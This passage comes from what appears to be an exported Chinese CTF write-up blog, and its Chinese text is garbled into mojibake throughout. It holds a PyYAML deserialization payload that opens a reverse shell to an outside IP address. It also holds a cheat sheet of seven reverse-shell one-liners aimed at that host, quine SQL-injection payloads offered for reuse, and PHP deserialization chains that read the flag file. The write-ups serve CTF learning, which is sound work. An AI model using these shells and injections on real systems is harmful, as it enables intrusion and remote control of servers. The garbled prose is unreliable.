random\nrandom.seed(0x0242ac024ed7) #å»æ‰ï¼šåŠ ä¸Š0xä¹Ÿå°±æ˜¯åå…­è¿›åˆ¶\nprint(str(random.random()*233))\n```\n\nå¾—åˆ°keyä¸º`33.893457812509084`\n\né€šè¿‡è„šæœ¬ä¼ªé€ session\n\nç„¶å`yaml.full_load(f)`å°±æ˜¯æ¼æ´æ‰€åœ¨ç‚¹ä»–ä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶å†…å®¹ååºåˆ—åŒ– å¹¶ä¸”ä»£ç ä¸­å¹¶æ²¡æœ‰å›æ˜¾çš„è¯­å¥ä¹Ÿæš—ç¤ºäº†è¿™é‡Œè¦é€šè¿‡åå¼¹shellçš„æ–¹å¼å»æ‰“ï¼ˆè¿™é‡Œå‚è€ƒè¿™ç¯‡å¤§ä½¬çš„æ–‡ç« å¤ªç»†äº† https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/ï¼‰\n\nä¸Šä¼ ååºåˆ—åŒ–æ–‡ä»¶\n\n```cmake\n!!python/object/new:str\n    args: []\n    # é€šè¿‡ state è§¦å‘è°ƒç”¨\n    state: !!python/tuple\n      - \"__import__('os').system('bash -c \\\"bash -i >& /dev/tcp/124.221.177.174/7777 <&1\\\"')\"#è¿™é‡Œå°±æ˜¯ä»£ç æ‰§è¡Œ é€šè¿‡bashç›´æ¥åå¼¹shell \n      # ä¸‹é¢æ„é€  exp\n      - !!python/object/new:staticmethod\n        args: []\n        state: \n          update: !!python/name:eval\n          items: !!python/name:list  # ä¸è®¾ç½®è¿™ä¸ªä¹Ÿå¯ä»¥ï¼Œä¼šæŠ¥é”™ä½†ä¹Ÿå·²ç»æ‰§è¡ŒæˆåŠŸ\n```\n\nè‡³äºä¸ºä»€ä¹ˆä¸Šé¢å¤§ä½¬çš„æ–‡ç« è®²çš„å¾ˆä»”ç»† æˆ‘å°±ä¸çŒ®ä¸‘äº† è‡ªå·±å¤ªèœäº†\n\nç®€å•ç†è§£å°±æ˜¯pythonå°†å‘½ä»¤æ‰§è¡Œçš„ä»£ç å¡å…¥äº†å¯¹è±¡ä¸­ç„¶åyamlåºåˆ—åŒ–å¾—åˆ°è¿™ä¸ª ç„¶åå†åˆ©ç”¨ååºåˆ—åŒ–å»å‘½ä»¤æ‰§è¡Œ çœ‹èµ·æ¥æ¯”è¾ƒå¥‡æ€ªæ˜¯å› ä¸ºè¿™ç§æ ¼å¼æ˜¯å±äºyamlå½¢å¼çš„åºåˆ—åŒ–å¯¹è±¡ æ‰€ä»¥çœ‹èµ·æ¥æ¯”è¾ƒçš„é™Œç”Ÿ è¿˜æœ‰å°±æ˜¯è¿™é‡Œçš„å‘½ä»¤æ‰§è¡Œæ˜¯ç”¨åå¼¹shell æ˜¯å› ä¸ºé€šè¿‡çœ‹æºç å‘ç°æ²¡æœ‰å›æ˜¾çš„ä»£ç  æ‰€ä»¥åªèƒ½é€šè¿‡åå¼¹shellå»å˜ç›¸å¾—åˆ°å›æ˜¾\n\nç„¶åå°†æ–‡ä»¶å‘½åä¸º2.txt è¿™é‡Œä¸èƒ½ç”¨`.yaml`åç¼€è¢«å±è”½äº†\n\næ—¢ç„¶æ˜¯txtåç¼€ä¸ºä»€ä¹ˆä»£ç ä¼šè¢«æ‰§è¡Œå‘¢\n\nè¿™é‡Œå€Ÿç”¨å¤§ä½¬çš„ç†è§£ï¼š\n\nçŒœæµ‹å¯èƒ½æ˜¯ï¼šè¿™é‡Œfull_loadè°ƒç”¨äº†loadå‡½æ•°ï¼Œè€Œloadå‡½æ•°è¾“å…¥çš„æ˜¯ä¸€ä¸ªsteam,ä¹Ÿå°±æ˜¯æµï¼ŒäºŒè¿›\nåˆ¶æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ç®¡æ˜¯ä»€ä¹ˆåç¼€éƒ½æ— å…³ç´§è¦äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682518211036-422e9054-fb3e-4dd9-83ca-b93c288dc87a.png)\n\nä¸Šä¼ ä¸Šå»\n\nç„¶åå»`/boogipop`è·¯ç”±ä¸‹å»è¯»å–ï¼Œç„¶ååå¼¹shell\n\nè¿™é‡Œæ–‡ä»¶è·¯å¾„æ˜¯`uplaods/2.txt`\n\nå¤§ä½¬æ–‡ç« ä¹Ÿæåˆ°äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517504048-653cd836-870e-46e6-93e7-ab8e3953106f.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517014776-8237fe1d-8919-406f-9912-cfc0abb2a08b.png)\n\nä¸è¦åœ¨æ„è¿™é‡Œä¸ºä»€ä¹ˆbpæŠ¥é”™ ncèƒ½è¿é€šå°±è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517082099-b27ae5c2-2d34-4496-8e96-9155ecfc2a77.png)\n\nåå¼¹shellæˆåŠŸ\n\nå†æ¥è¯´è¯´åå¼¹shell\n\nè¿™é‡Œå°±è¯´è¯´æˆ‘çš„ç†è§£ï¼Œä¸ä¼šå»å°†æ‰€æœ‰æ¦‚å¿µä¸€å­—ä¸æ¼çš„æ‰“å‡ºæ¥ï¼Œæˆ‘è§‰å¾—æ²¡å¿…è¦ï¼Œç†è§£æ˜¯æœ€æ£’çš„ï¼Œæƒ³çœ‹æ¦‚å¿µéšæ—¶éƒ½å¯ä»¥ç™¾åº¦ï¼Œä½†æ˜¯å”¯ç‹¬ç†è§£æ˜¯æ£€æµ‹è‡ªå·±æ˜¯å¦å¯¹äºä¸€ä¸ªçŸ¥è¯†ç‚¹çœŸçš„ç†è§£äº†\n\næˆ‘ä»¬ä¸€èˆ¬ä¸»åŠ¨æ”»å‡»å»è¿æ¥æŸä¸ªç”µè„‘ï¼Œå«åšæ­£å‘è¿æ¥ï¼Œä¸€èˆ¬çŸ¥é“è¿™ä¸ªç”µè„‘ä¸€äº›ä¿¡æ¯ipä¹‹ç±»çš„ï¼ŒçŸ¥é“å®ƒä½•æ—¶åœ¨åšä»€ä¹ˆ\n\nä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“è¿™å°ç”µè„‘ä¿¡æ¯ipä»€ä¹ˆçš„ï¼Œæˆ–è€…æ­¤æ—¶æ­¤åˆ»çš„çŠ¶æ€ï¼Œå°±å«è–›å®šè°”çŠ¶æ€å§ï¼ˆbushiï¼Œå°±æ²¡æ³•å»è¿æ¥å»æ”»å‡» é‚£ä¹ˆåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\n\nè¿™é‡Œå°±ç”¨åˆ°äº†åå¼¹shell ä½•ä¸ºåå¼¹ï¼Ÿ\n\næ—¢ç„¶æˆ‘ä»¬ä¸çŸ¥é“å¯¹æ–¹çš„çŠ¶æ€ ä½†æ˜¯æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬çš„çŠ¶æ€ä¿¡æ¯ æˆ‘ä»¬å¯ä»¥æä¾›æˆ‘ä»¬è‡ªå·±çš„ä¸€äº›ä¿¡æ¯å»è®©å¯¹æ–¹æ‰¾åˆ°æˆ‘ä»¬ç„¶åè¿æ¥ä¸å°±è¡Œäº†ï¼Ÿ\n\nè¿™é‡Œå¯ä»¥è¿™ä¹ˆå½¢è±¡çš„æ¯”å–»ï¼š\n\nç®€å•çš„è¯´ï¼Œå°±æ˜¯æˆ‘é€äº†å°æ˜ä¸€ä»½ç¤¼ç‰©ï¼Œå°æ˜æ”¶åˆ°äº†ï¼Œçœ‹è§ç¤¼ç‰©é‡Œé¢å†™ç€xxxå¤§è¡—xxxæˆ·xxxå·é¢†å–(æœ¨é©¬)ï¼Œå°æ˜å»äº†æ•²é—¨(æ‰“å¼€æœ¨é©¬ï¼Œåå¼¹shell)ï¼Œæˆ‘å¼€é—¨æŠŠä»–æ‹‰è¿›æ¥(netcat)ï¼Œè¿™æ ·æˆ‘å°±æœ‰äº†ä»–çš„æ”¯é…æƒï¼Œä»–çš„æ“ä½œå°±è¢«æˆ‘æ§åˆ¶äº†ã€‚\n\næ¥è‡ªä¸€ä¸ªbç«™ç½‘å‹ æˆ‘è§‰å¾—å¾ˆå½¢è±¡èƒ½ç†è§£åå¼¹shellçš„æ¦‚å¿µ\n\næ—¢ç„¶æ˜¯å¯¹æ–¹æ‰¾åˆ°æˆ‘ä»¬ï¼Œå°±éœ€è¦ç”¨å…¬ç½‘ipï¼Œæˆ‘ä»¬ç‰©ç†æœºçš„ipéƒ½æ˜¯ä¸€ä¸ªå±€åŸŸç½‘åˆ†é…çš„ï¼ŒçœŸå®ipéƒ½æŒæ¡åœ¨è¿è¥å•†æ‰‹é‡Œ\n\nè¿™é‡Œå°±éœ€è¦ç”¨åˆ°vpsæˆ–è€…åœ¨å¤§å‚ä¹°äº‘æœåŠ¡å³å¯ï¼Œå½“ç„¶ä¹Ÿä¸å½±å“æˆ‘ç™½å«–å®¤å‹çš„äº‘æœåŠ¡å™¨:)\n\nä»¥ä¸Šåªæ˜¯æˆ‘æµ…è–„çš„ç†è§£ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« æ·±å…¥ç†è§£ï¼šhttps://xz.aliyun.com/t/9488\n\nç„¶åæˆ‘ç®€å•æ€»ç»“äº†ä¸€ä¸‹ä¸€äº›å¸¸ç”¨çš„åå¼¹shellçš„expï¼š\n\n```cmake\n1.nc\nnetcat 124.221.177.174 7777 -e /bin/bash\n2.bash\nbash -i >& /dev/tcp/124.221.177.174/7777 0>&1\n3.Telnet:\nmknod a p; telnet 124.221.177.174 7777 0<a | /bin/bash 1>a\n4.python:\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"124.221.177.174\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n5.php\nphp -r '$sock=fsockopen(\"124.221.177.174\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n6.perl:\nperl -e 'use Socket;$i=\"124.221.177.174\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n7.sh\nnc 124.221.177.174 7777 -e /bin/sh\n```\n\nå›åˆ°é¢˜ç›®ï¼Œå‘ç°æ²¡æœ‰å…³äºflagçš„æ–‡ä»¶ï¼Œæ‰€ä»¥è¿˜æ˜¯é€šè¿‡è¯»å–ç¯å¢ƒå˜é‡æ¥è¯»flagï¼Œç»“æŸã€‚\n\n## LoginMaster\n\nè¿™é“é¢˜ æˆ‘çš„è¯„ä»·æ˜¯å¯„ï¼Œåˆ·é¢˜æ²¡åˆ·åˆ°è¿‡è¿™æ ·çš„æ³¨å…¥â€”â€”quineæ³¨å…¥ï¼Œè¿˜æœ‰æ—¶é—´ç›²æ³¨ä¹Ÿè¿˜æ²¡æœ‰å¼€å§‹å­¦å€ŸåŠ©æ­¤æ¬¡æœºä¼šå­¦ä¹ å­¦ä¹ \n\né¦–å…ˆæ—¥å¸¸å…ˆçœ‹`/robots.txt`å‘ç°äº†waf\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682570503152-ae120381-50eb-43c4-9634-a47cff72b0f9.png)\n\nçœ‹åˆ°wafåæˆ‘å°±é™·å…¥äº†æ²‰æ€ï¼Œæˆ‘èƒ½æƒ³åˆ°çš„payloadæ‰€åŒ…å«çš„å‡ ä¹éƒ½æ²³èŸ¹äº†ä¸ªéï¼Œè¿™è¿˜æ€ä¹ˆç©ï¼Œå°±æ”¾å¼ƒäº†\n\nçœ‹äº†wpè¦ç”¨æ—¶é—´ç›²æ³¨å’Œquineç»„åˆæ‹³å»æ‰“\n\nå…¶å®çœ‹äº†waf è¿™æ®µä»£ç ä¹Ÿå¤§æ¦‚èƒ½æ„Ÿè§‰åˆ°æ˜¯quineæ³¨å…¥ \n\nè¿™é‡Œå°±æ˜¯éœ€è¦æˆ‘ä»¬è¾“å…¥çš„å¯†ç ä¸æŸ¥è¯¢åˆ°çš„å¯†ç ç›¸ç­‰ \n\n```cmake\nif ($row['password'] === $password) {\n        die($FLAG);\n```\n\nè¯´ç®€å•ä¸€ç‚¹ï¼Œquineæ³¨å…¥å°±æ˜¯è¾“å…¥ä¸è¾“å‡ºå®Œå…¨ç›¸åŒ è‡ªäº§ç”Ÿç¨‹åºä¹Ÿå°±æ˜¯è¯´å°±æ˜¯è¾“å…¥çš„sqlè¯­å¥ä¸è¦è¾“å‡ºçš„ä¸€è‡´  \n\nç”¨åˆ°replace()å‡½æ•°\n\nå¦‚æœè¾“å…¥ `replace(\".\",char(46),\".\") ` \n\nåˆ™ä¼šè¾“å‡º `.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596804773-43900a23-f1bb-4f21-bd92-1258a4af3700.png)\n\nå¦‚æœè¾“å…¥  `replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")') ` \n\nåˆ™ä¼šç”¨ç¬¬ä¸‰ä¸ªå‚æ•°å»æ›¿æ¢ç¬¬ä¸€ä¸ªå‚æ•°ä¸­çš„æ‰€æœ‰`.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596879463-3e74e07c-7f75-48f1-92e4-69d21e9d6a21.png)\n\nä½†æ˜¯æ­¤æ—¶å°±ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ æˆ‘ä»¬è¾“å…¥ä¸è¾“å‡ºå¹¶ä¸æ˜¯å®Œå…¨ç›¸åŒçš„\n\næˆ‘ä»¬è¾“å…¥çš„å•å¼•å·åœ¨è¾“å‡ºè¯­å¥é‡Œéƒ½æ˜¯åŒå¼•å·\n\nå› æ­¤ éœ€è¦åœ¨repalceé‡Œé¢å†åµŒå¥—ä¸€ä¸ªreplaceæ¥è®©åŒå¼•å·è½¬æˆå•å¼•å·  \n\n```\nreplace(replace(\".\",char(34),char(39)),char(46),\".\")\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597458239-a1bc5eba-19bd-4464-afe0-f5582b6f9c02.png)\n\nç”¨ä¸Šé¢çš„å¼å­æ›¿æ¢æ‰€æœ‰çš„`.`\n\n```\nreplace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")')\n```\n\nå°±ä¼šå‘ç°è¾“å…¥ä¸è¾“å‡ºå®Œå…¨ç›¸ç­‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597557792-2a8afbc9-a8a2-4de8-a340-a3415d2e2d08.png)\n\n å›åˆ°é¢˜ç›® å› ä¸ºå±è”½äº†ç©ºæ ¼ç”¨`()`åµŒå¥—æˆ–è€…`/**/`ç»•è¿‡éƒ½è¡Œ\n\npayload:`1'UNION(SELECT(REPLACE(REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39)),CHAR(37),'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#')))#`\n\nåˆ†æï¼š\n\n`1'UNION(SELECT(REPLACE(A,CHAR(37),B)))`  ç”¨Bæ›¿æ¢%,%è¿™ä¸ªç¬¦å·åº”è¯¥æ˜¯ä»»æ„çš„åç»­æ›¿æ¢æ—¶å˜æˆç›¸åº”çš„charå°±è¡Œ\n\n`A:REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39))`  åŒå¼•å·æ¢ä¸ºå•å¼•å·->æ›¿æ¢%->åŒå¼•å·æ¢ä¸ºå•å¼•å·\n\n```\nB:'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#'\n```\n\nåŒå¼•å·æ¢ä½å•å¼•å·->æ›¿æ¢%\n\næä¾›ä¸‰ç§payloadå§ï¼Œä»¥åå¦‚æœå†é‡åˆ°è¿™æ ·çš„é¢˜ç›®ä¹Ÿèƒ½æ‹¿æ¥ç›´æ¥ç”¨\n\n1. `1'/**/union/**/select/**/replace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#`\n2. `1'union/**/select/**/replace(replace('1\"union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#`\n3. `1'UNION(SELECT(REPLACE(REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39)),CHAR(37),'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#')))#`\n\nç¬¬ä¸€ä¸ªpayloadä¸ç¬¬äºŒä¸ªpayloadä¹‹é—´çš„å·®è·ï¼šä¸ºç¬¬ä¸€ä¸ªä¸unionä¹‹é—´æœ‰ç©ºæ ¼ï¼Œç¬¬äºŒä¸ªæ— ï¼Œæœ¬è´¨ä¸Šä¸¤ä¸ªpayloadæ— åŒºåˆ«\n\næ³¨æ„sqlä¸­ä¸ºchar()è€Œä¸æ˜¯chr() ç½‘ä¸Špayloadéœ€è¦è½¬æ¢\n\næå®šï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682598202760-5e0a4fac-7660-4486-bee9-9ef75f6b6530.png)\n\nè‡³äºæ—¶é—´ç›²æ³¨è¿™ä¸ªå‘ï¼Œä»¥åé‡åˆ°ç»å…¸é¢˜å‹å€ŸåŠ©é¢˜ç›®æ¥æ€»ç»“å§ï¼Œè¿™é‡Œæ’ä¸ªçœ¼å…ˆ:)\n\nè¿˜æœ‰ä¸¤é“javaé¢˜ç›®å°±ä¸å¤ç°äº†ï¼Œjavaè¿˜æ˜¯æˆ‘æ²¡æœ‰è§£é”çš„é¢†åŸŸï¼Œå¤ç°èµ·æ¥ä¹Ÿå¾ˆåƒåŠ›ï¼Œä¹‹åç³»ç»Ÿå¼€å§‹å­¦javaä¹‹åå†æ¥å¤ç°å¡«å‘å§ã€‚\n\n# å°å°¾å·´\n\nè¿™æ¬¡æ‰“å®Œçœèµ›ï¼ˆæ ¡èµ›bushiï¼‰è™½ç„¶å¾ˆæ°´ï¼Œä½†æ˜¯æˆåŠŸçˆ¬è¿›äº†å­¦æ ¡çš„å®éªŒå®¤ï¼Œä¹Ÿç®—æ˜¯ä¸€æ®µæ—¶é—´çš„åŠªåŠ›æ€»ç®—æœ‰äº†æˆæœå§ï¼Œè¿›äº†å®éªŒå®¤æ‰æ˜¯åˆšåˆšå¼€å§‹ï¼Œè‡ªèº«è¿˜æ˜¯æœ‰å¾ˆå¤šä¸è¶³ï¼Œéœ€è¦ç»§ç»­åŠªåŠ›ï¼Œç»§ç»­å¥‹æ–—ï¼Œå¹²å·´å¾—ï¼\n","tags":["Smartyæ¨¡æ¿æ³¨å…¥","js","Yamlååºåˆ—åŒ–","shellåå¼¹","quineæ³¨å…¥","python3è§£æç‰¹æ€§"],"categories":["å„èµ›äº‹WP"]},{"title":"CTF-SHOW 2023æ„šäººæ¯ WEBéƒ¨åˆ†WP","url":"/post/186d5605.html","content":"\nCTF-SHOW 2023æ„šäººæ¯ WEBéƒ¨åˆ†WP\n\n<!--more-->\n\n# Challenge_1 easy_signin\n\nè¿™é“é¢˜åƒæ˜¯buuctfä¸€ä¸ªé¢˜ç›®çš„å¥—çš®ï¼ŒæŸ¥çœ‹æºç å’Œurlï¼Œå›¾ç‰‡å†…å®¹æ˜¯ä»¥base64ç¼–ç è¾“å‡ºçš„ï¼Œå¹¶ä¸”è¯·æ±‚æ–‡ä»¶åç§°ä¹Ÿæ˜¯é€šè¿‡base64ç¼–ç ï¼Œç›´æ¥æŸ¥çœ‹index.phpçš„å†…å®¹ï¼Œå…ˆç¼–ç ä¸€ä¸‹index.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677699456-4fddbbeb-4ad5-4059-9bd5-e8707545697e.png)\n\npayloadï¼š`?img=aW5kZXgucGhw`\n\næ‹¿åˆ°base64åŠ å¯†åçš„å†…å®¹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677766484-107ac894-6af0-47d9-babb-dbc944ecdae2.png)\n\nå†å»è§£å¯†ä¸€ä¸‹ï¼Œæ‹¿åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677805971-9deab45d-79af-4408-9836-64167015721e.png)\n\n# Challenge_2 è¢«é—å¿˜çš„ååºåˆ—åŒ–\n\n\n\nè¿™é“é¢˜ç›®æ²¡åšå‡ºæ¥ï¼Œä¸€å¼€å§‹å°±å¡ä½äº†ï¼Œä»–æç¤ºå½“å‰ç›®å½•æœ‰ä¸ªtxtæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±åº”è¯¥å…ˆå»è¯»è¿™ä¸ªæ–‡ä»¶è·å–ç›¸åº”çš„æç¤ºï¼Œä¸ä¼šå•Šï¼Œçœ‹äº†wpï¼Œå‘ç°ç”¨äº†phpåŸç”Ÿç±»è¯»çš„ï¼ŒçœŸçš„å¤ªå¼ºäº†\n\nç„¶åè¿™é“é¢˜é¢„æœŸè§£çœŸçš„å¤ªéº»çƒ¦äº†ï¼Œè¿˜è¦æ¶‰åŠå¯†ç åç§»é—®é¢˜ï¼Œè€Œä¸”è¿˜è¦è„šæœ¬çˆ†ç ´ï¼Œéé¢„æœŸçœŸçš„å¾ˆç®€å•\n\n```php\n<?php\n\n# å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦\nerror_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this->text == \"aaaa\"){\n            echo lcfirst($this->text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -> aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -> a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -> key)){\n            $this->key = file_get_contents($this -> file);\n        }else{\n            echo \"ä¸è¡Œå“¦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this->aaa;\n    }\n\n    public function __invoke(){\n        $this -> aaa = clone new EeE;\n    }\n}\n\n$_ip = $_SERVER[\"HTTP_AAAAAA\"];\nunserialize($_ip);\n```\n\nç›´æ¥æ¥çœ‹è¿™é‡Œï¼š\n\n```php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n}   \n```\n\n`$a = new $this->coos($this->file);` è¿™ä¸€è¡Œ çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æ„é€ ä¸€ä¸ªå¯å˜å‡½æ•° å½¢å¦‚ï¼š$a($b)çš„å½¢å¼è¾¾åˆ°getshellçš„æ“ä½œ ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªnew å°†ç±»å®ä¾‹åŒ– ä¹Ÿå°±æ„ä¸ºç€ä¸èƒ½é€šè¿‡è¿™æ ·æ¥æ„é€ å¯å˜å‡½æ•°\n\né‚£ä¹ˆè¿™é‡Œå°±ç”¨åˆ°äº†phpçš„åŸç”Ÿç±»ï¼Œå…·ä½“çœ‹è¿™ç¯‡æ–‡ç« ï¼šhttps://blog.csdn.net/cjdgg/article/details/115314651\n\nå¯éå†ç›®å½•çš„åŸç”Ÿç±»ï¼š\n\nDirectoryIterator ç±»\nFilesystemIterator ç±»\n\nGlobIterator ç±»  \n\nä½¿ç”¨ DirectoryIterator ç±»\nDirectoryIteratoré…åˆglob://åè®®ç»“åˆå°†æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥åˆ—ä¸¾å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ \n\næ¯”å¦‚ä»¥è¿™æ ·çš„`/f*`å½¢å¼æ¨¡ç³Šæ“ä½œæ¥è·å¾—flagçš„æ–‡ä»¶å\n\næ¯”å¦‚æˆ‘winç”µè„‘ä¸Šdç›˜æ ¹ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªblogæ–‡ä»¶,æˆ‘å°±å¯ä»¥åˆ©ç”¨åŸç”Ÿç±»å†é…åˆglobåè®®è·å–åˆ°è¯¥æ–‡ä»¶çš„å…·ä½“æ–‡ä»¶å\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680679507460-93022bf0-b786-497a-ae92-c77e7bcaad71.png)\n\nå›åˆ°é¢˜ç›®ï¼šæœ¬åœ°æ„é€ \n\n```php\n<?php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n}   \n\n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n}\n\n\n$w=new w_wuw_w();\n$w->aaa=new gBoBg(); //é€šè¿‡ç±»W_WUW_Wä¸­çš„ææ„å‡½æ•°æ¥è°ƒç”¨ç±»gBoBgä¸­çš„__toStringé­”æœ¯æ–¹æ³•\n$w->aaa->name=\"1\";\n$w->aaa->file=\"glob:///f*\";\n$w->aaa->coos=\"DirectoryIterator\";\necho urlencode(serialize($w));\n?>\n```\n\nç„¶åè¿™é‡Œä¼ å‚æ˜¯é€šè¿‡è¯·æ±‚åŒ…ä¸­AAAAAAæ¥ä¼ å‚çš„è›®æ–°é¢–çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680020351-96a2b7d8-9c2b-4bae-a866-bdb03409e953.png)\n\nç„¶åå†é€šè¿‡è¯»æ–‡ä»¶åŸç”Ÿç±»æ¥è¯»flag\n\nSplFileObject\n\næœ¬åœ°æ„é€ ï¼š\n\n```php\n<?php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n}   \n\n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n}\n\n\n$w=new w_wuw_w();\n$w->aaa=new gBoBg(); //é€šè¿‡ç±»W_WUW_Wä¸­çš„ææ„å‡½æ•°æ¥è°ƒç”¨ç±»gBoBgä¸­çš„__toStringé­”æœ¯æ–¹æ³•\n$w->aaa->name=\"1\";\n$w->aaa->file=\"/f1agaaa\";\n$w->aaa->coos=\"SplFileObject\";\necho serialize($w);\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680133216-6324145c-b089-45c1-b238-7e7d2e81a43b.png)\n\n# Challenge_3 easy_ssti\n\nè¿™é“é¢˜è¿˜æ˜¯è›®ç®€å•çš„ æ ¹æ®é¢˜ç›®æ˜¯ä¸€ä¸ªæ¨¡æ¿æ³¨å…¥çš„é¢˜ç›®\n\næŸ¥çœ‹æºç  ä¸‹è½½ä¸€ä¸ªå‹ç¼©åŒ…\n\n```php\nfrom flask import Flask\nfrom flask import render_template_string,render_template\napp = Flask(__name__)\n\n@app.route('/hello/')\ndef hello(name=None):\n    return render_template('hello.html',name=name)\n@app.route('/hello/<name>')\ndef hellodear(name):\n    if \"ge\" in name:\n        return render_template_string('hello %s' % name)\n    elif \"f\" not in name:\n        return render_template_string('hello %s' % name)\n    else:\n        return 'Nonononon'\n```\n\nä¸€çœ¼é¡¶é’ˆï¼Œflaskçš„æ¨¡æ¿æ³¨å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680541981-d158f0ea-eb91-455f-96f7-e07327426721.png)\n\nç„¶åç½‘ä¸Špayoadå¤ªå¤šäº†ï¼ˆhttps://blog.csdn.net/qq_46918279/article/details/121270806ï¼‰\n\nè¿™é‡Œä¸»è¦è¿‡æ»¤äº†æ–œæ ï¼Œå¯ä»¥ç”¨`${HOME:0:1}`ç»•è¿‡\n\npayload: 